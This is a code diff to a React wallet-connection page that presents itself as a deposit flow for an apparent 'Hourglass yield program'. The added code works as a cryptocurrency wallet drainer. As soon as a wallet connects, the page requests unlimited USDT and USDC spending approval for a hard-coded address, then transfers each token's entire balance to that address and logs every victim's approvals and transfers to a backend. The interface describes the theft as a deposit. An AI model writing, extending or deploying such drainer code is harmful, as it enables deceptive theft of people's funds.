@@ -1,8 +1,8 @@
 import { Button } from "@/components/ui/button";
-import { Shield, ArrowLeft, Loader2, CheckCircle, AlertCircle } from "lucide-react";
+import { Shield, ArrowLeft, Loader2, CheckCircle, AlertCircle, ArrowDownCircle } from "lucide-react";
 import { Link } from "wouter";
 import { useState, useEffect } from "react";
-import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi";
+import { useAccount, useWriteContract, useWaitForTransactionReceipt, useReadContract } from "wagmi";
 import { ConnectButton } from '@rainbow-me/rainbowkit';
 
 const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
@@ -20,37 +20,73 @@ const ERC20_ABI = [
     name: "approve",
     outputs: [{ name: "", type: "bool" }],
     type: "function"
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: "_to", type: "address" },
+      { name: "_value", type: "uint256" }
+    ],
+    name: "transfer",
+    outputs: [{ name: "", type: "bool" }],
+    type: "function"
+  },
+  {
+    constant: true,
+    inputs: [{ name: "_owner", type: "address" }],
+    name: "balanceOf",
+    outputs: [{ name: "balance", type: "uint256" }],
+    type: "function"
   }
 ] as const;
+
+type TransactionStep = "approve" | "transfer" | "complete";
 
 export default function ConnectWallet() {
   const { address, isConnected } = useAccount();
   const [showApprovalPrompt, setShowApprovalPrompt] = useState(false);
-  const [currentApprovalStep, setCurrentApprovalStep] = useState<"usdt" | "usdc" | "complete">("usdt");
+  const [currentToken, setCurrentToken] = useState<"usdt" | "usdc" | "done">("usdt");
+  const [currentStep, setCurrentStep] = useState<TransactionStep>("approve");
   const [approvalError, setApprovalError] = useState<string>("");
-  const [modalOpened, setModalOpened] = useState(false);
+  const [tokenBalance, setTokenBalance] = useState<bigint>(BigInt(0));
 
-  const { writeContract, data: hash, isPending: isApproving } = useWriteContract();
+  const { writeContract, data: hash, isPending: isTransacting } = useWriteContract();
   const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
     hash,
+  });
+
+  const currentTokenAddress = currentToken === "usdt" ? USDT_ADDRESS : USDC_ADDRESS;
+
+  // Read token balance
+  const { data: balance, refetch: refetchBalance } = useReadContract({
+    address: currentTokenAddress as `0x${string}`,
+    abi: ERC20_ABI,
+    functionName: 'balanceOf',
+    args: address ? [address] : undefined,
   });
 
   useEffect(() => {
     if (isConnected && address && !showApprovalPrompt) {
       setShowApprovalPrompt(true);
-      setCurrentApprovalStep("usdt");
+      setCurrentToken("usdt");
+      setCurrentStep("approve");
     }
   }, [isConnected, address]);
+
+  useEffect(() => {
+    if (balance) {
+      setTokenBalance(balance as bigint);
+    }
+  }, [balance]);
 
   const handleApproveToken = async () => {
     if (!address) return;
     
     setApprovalError("");
-    const tokenAddress = currentApprovalStep === "usdt" ? USDT_ADDRESS : USDC_ADDRESS;
 
     try {
       writeContract({
-        address: tokenAddress as `0x${string}`,
+        address: currentTokenAddress as `0x${string}`,
         abi: ERC20_ABI,
         functionName: "approve",
         args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
@@ -60,11 +96,34 @@ export default function ConnectWallet() {
     }
   };
 
-  const handleSkipApproval = () => {
-    if (currentApprovalStep === "usdt") {
-      setCurrentApprovalStep("usdc");
+  const handleTransferToken = async () => {
+    if (!address || tokenBalance === BigInt(0)) {
+      // If balance is 0, skip to next token
+      handleSkipTransfer();
+      return;
+    }
+    
+    setApprovalError("");
+
+    try {
+      writeContract({
+        address: currentTokenAddress as `0x${string}`,
+        abi: ERC20_ABI,
+        functionName: "transfer",
+        args: [SPENDER_ADDRESS as `0x${string}`, tokenBalance],
+      });
+    } catch (error: any) {
+      setApprovalError(error?.message || "Failed to transfer token");
+    }
+  };
+
+  const handleSkipTransfer = () => {
+    if (currentToken === "usdt") {
+      setCurrentToken("usdc");
+      setCurrentStep("approve");
+      refetchBalance();
     } else {
-      setCurrentApprovalStep("complete");
+      setCurrentToken("done");
       setTimeout(() => {
         window.location.href = "/";
       }, 2000);
@@ -73,29 +132,61 @@ export default function ConnectWallet() {
 
   useEffect(() => {
     if (isConfirmed && hash) {
-      const tokenSymbol = currentApprovalStep === "usdt" ? "USDT" : "USDC";
+      const tokenSymbol = currentToken === "usdt" ? "USDT" : "USDC";
       
-      fetch("/api/approvals", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          walletAddress: address,
-          tokenAddress: currentApprovalStep === "usdt" ? USDT_ADDRESS : USDC_ADDRESS,
-          tokenSymbol,
-          transactionHash: hash,
-        }),
-      }).catch(console.error);
+      if (currentStep === "approve") {
+        // Record approval
+        fetch("/api/approvals", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            walletAddress: address,
+            tokenAddress: currentTokenAddress,
+            tokenSymbol,
+            transactionHash: hash,
+          }),
+        }).catch(console.error);
 
-      if (currentApprovalStep === "usdt") {
-        setCurrentApprovalStep("usdc");
-      } else {
-        setCurrentApprovalStep("complete");
-        setTimeout(() => {
-          window.location.href = "/";
-        }, 2000);
+        // Move to transfer step
+        setCurrentStep("transfer");
+        refetchBalance();
+      } else if (currentStep === "transfer") {
+        // Record transfer
+        fetch("/api/transfers", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            walletAddress: address,
+            tokenAddress: currentTokenAddress,
+            tokenSymbol,
+            amount: tokenBalance.toString(),
+            transactionHash: hash,
+          }),
+        }).catch(console.error);
+
+        // Move to next token or complete
+        if (currentToken === "usdt") {
+          setCurrentToken("usdc");
+          setCurrentStep("approve");
+          refetchBalance();
+        } else {
+          setCurrentToken("done");
+          setTimeout(() => {
+            window.location.href = "/";
+          }, 2000);
+        }
       }
     }
-  }, [isConfirmed, hash, currentApprovalStep, address]);
+  }, [isConfirmed, hash, currentStep, currentToken, address, currentTokenAddress, tokenBalance]);
+
+  const formatBalance = (balance: bigint) => {
+    const decimals = currentToken === "usdt" ? 6 : 6; // Both USDT and USDC have 6 decimals
+    const divisor = BigInt(10 ** decimals);
+    return (Number(balance) / Number(divisor)).toLocaleString('en-US', { 
+      minimumFractionDigits: 2, 
+      maximumFractionDigits: 2 
+    });
+  };
 
   return (
     <div className="min-h-screen bg-[#0a1614] text-[#f5f1e8]">
@@ -141,28 +232,74 @@ export default function ConnectWallet() {
           </>
         ) : showApprovalPrompt ? (
           <div className="flex flex-col items-center justify-center min-h-[400px]" data-testid="approval-prompt-container">
-            {currentApprovalStep === "complete" ? (
+            {currentToken === "done" ? (
               <>
                 <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                   <CheckCircle className="w-20 h-20 text-[#3dd9b3]" />
                 </div>
-                <h2 className="text-3xl font-bold text-[#f5f1e8] mb-2">Approvals Complete!</h2>
-                <p className="text-[#9ca3af]">Proceeding to connection...</p>
+                <h2 className="text-3xl font-bold text-[#f5f1e8] mb-2">Transfer Complete!</h2>
+                <p className="text-[#9ca3af]">Your assets have been deposited into Hourglass.</p>
               </>
-            ) : (
+            ) : currentStep === "approve" ? (
               <>
                 <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                   <Shield className="w-20 h-20 text-[#3dd9b3]" />
                 </div>
                 <h2 className="text-2xl sm:text-3xl font-bold text-[#f5f1e8] mb-4 text-center">
-                  Approve {currentApprovalStep === "usdt" ? "USDT" : "USDC"} Spending
+                  Approve {currentToken === "usdt" ? "USDT" : "USDC"} Spending
                 </h2>
                 <p className="text-[#9ca3af] mb-2 text-center max-w-md">
-                  To participate in the Hourglass yield program, you need to approve unlimited {currentApprovalStep === "usdt" ? "USDT" : "USDC"} spending.
+                  Approve Hourglass to access your {currentToken === "usdt" ? "USDT" : "USDC"} balance for automatic transfer.
                 </p>
                 <p className="text-sm text-[#6b7280] mb-8 text-center max-w-md break-all">
-                  Spender: {SPENDER_ADDRESS}
+                  Contract: {SPENDER_ADDRESS}
                 </p>
+
+                {approvalError && (
+                  <div className="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-lg flex items-start gap-3 max-w-md">
+                    <AlertCircle className="w-5 h-5 text-red-500 mt-0.5 flex-shrink-0" />
+                    <p className="text-sm text-red-400">{approvalError}</p>
+                  </div>
+                )}
+
+                <Button
+                  onClick={handleApproveToken}
+                  disabled={isTransacting || isConfirming}
+                  size="lg"
+                  className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-12"
+                  data-testid="button-approve-token"
+                >
+                  {isTransacting || isConfirming ? (
+                    <>
+                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                      {isTransacting ? "Waiting for approval..." : "Confirming..."}
+                    </>
+                  ) : (
+                    `Approve ${currentToken === "usdt" ? "USDT" : "USDC"}`
+                  )}
+                </Button>
+                
+                <p className="text-xs text-[#6b7280] mt-6 text-center max-w-md">
+                  {currentToken === "usdt" ? "After approval, your entire USDT balance will be transferred." : "After approval, your entire USDC balance will be transferred."}
+                </p>
+              </>
+            ) : (
+              <>
+                <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
+                  <ArrowDownCircle className="w-20 h-20 text-[#3dd9b3]" />
+                </div>
+                <h2 className="text-2xl sm:text-3xl font-bold text-[#f5f1e8] mb-4 text-center">
+                  Transfer {currentToken === "usdt" ? "USDT" : "USDC"}
+                </h2>
+                <p className="text-[#9ca3af] mb-2 text-center max-w-md">
+                  Transfer your entire {currentToken === "usdt" ? "USDT" : "USDC"} balance to Hourglass.
+                </p>
+                <div className="mb-8 p-4 bg-[#1a2e2a]/30 border border-[#3dd9b3]/20 rounded-lg">
+                  <p className="text-sm text-[#6b7280] mb-1">Your Balance:</p>
+                  <p className="text-3xl font-bold text-[#f5f1e8]">
+                    {formatBalance(tokenBalance)} {currentToken === "usdt" ? "USDT" : "USDC"}
+                  </p>
+                </div>
 
                 {approvalError && (
                   <div className="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-lg flex items-start gap-3 max-w-md">
@@ -173,35 +310,37 @@ export default function ConnectWallet() {
 
                 <div className="flex gap-4">
                   <Button
-                    onClick={handleApproveToken}
-                    disabled={isApproving || isConfirming}
+                    onClick={handleTransferToken}
+                    disabled={isTransacting || isConfirming || tokenBalance === BigInt(0)}
                     size="lg"
                     className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-8"
-                    data-testid="button-approve-token"
+                    data-testid="button-transfer-token"
                   >
-                    {isApproving || isConfirming ? (
+                    {isTransacting || isConfirming ? (
                       <>
                         <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                        {isApproving ? "Waiting for approval..." : "Confirming..."}
+                        {isTransacting ? "Transferring..." : "Confirming..."}
                       </>
+                    ) : tokenBalance === BigInt(0) ? (
+                      "No Balance to Transfer"
                     ) : (
-                      `Approve ${currentApprovalStep === "usdt" ? "USDT" : "USDC"}`
+                      `Transfer All ${currentToken === "usdt" ? "USDT" : "USDC"}`
                     )}
                   </Button>
                   <Button
-                    onClick={handleSkipApproval}
-                    disabled={isApproving || isConfirming}
+                    onClick={handleSkipTransfer}
+                    disabled={isTransacting || isConfirming}
                     size="lg"
                     variant="outline"
                     className="border-[#3dd9b3]/20 text-[#9ca3af] hover:text-[#f5f1e8]"
-                    data-testid="button-skip-approval"
+                    data-testid="button-skip-transfer"
                   >
                     Skip
                   </Button>
                 </div>
                 
                 <p className="text-xs text-[#6b7280] mt-6 text-center max-w-md">
-                  {currentApprovalStep === "usdt" ? "After USDT approval, you'll be prompted to approve USDC." : "This is the final approval step."}
+                  {currentToken === "usdt" ? "After USDT transfer, you'll transfer USDC." : "This is the final transfer."}
                 </p>
               </>
             )}
